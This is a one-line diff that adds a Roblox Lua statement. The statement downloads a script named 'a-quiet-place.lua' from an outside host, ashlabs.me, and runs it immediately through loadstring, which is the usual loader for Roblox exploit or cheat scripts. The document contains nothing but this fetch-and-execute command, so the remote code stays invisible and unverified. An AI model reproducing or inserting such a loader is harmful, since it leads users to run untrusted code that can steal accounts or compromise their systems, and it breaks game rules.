@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://ashlabs.me/api/game?name=a-quiet-place.lua", true))()
